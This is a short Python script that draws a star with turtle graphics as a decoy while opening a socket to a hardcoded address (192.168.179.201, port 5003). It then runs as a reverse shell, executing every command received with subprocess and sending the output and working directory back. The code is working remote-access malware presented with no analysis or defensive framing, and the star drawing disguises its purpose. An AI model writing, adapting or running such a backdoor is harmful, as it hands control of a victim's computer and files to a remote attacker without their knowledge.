from email import message
import socket
import os
import subprocess
import turtle

def fun():
    import time
    star = turtle.Turtle()
 
    star.right(75)
    star.forward(100)
    
    for i in range(4):
        star.right(144)
        star.forward(100)
        if (i==3):
            turtle.Screen().exitonclick()
    

# hostname=socket.gethostname()
ser_host = "192.168.179.201"
ser_port = 5003
size = 1024*128
sep = "<sep>"

s = socket.socket()
s.connect((ser_host, ser_port))

cwd = os.getcwd()
s.send(cwd.encode())


fun()
while True:
    command = s.recv(size).decode()
    split_command = command.split()

    if command.lower() == "exit":
        break

    if split_command[0].lower() == "cd":
        try:
            os.chdir(''.join(split_command[1:]))
        except FileNotFoundError as e:
            out = str(e)
        else:
            out = ""
    else:
        out = subprocess.getoutput(command)
    cwd = os.getcwd()

    msg = f"{out}{sep}{cwd}"
    s.send(msg.encode())

s.close()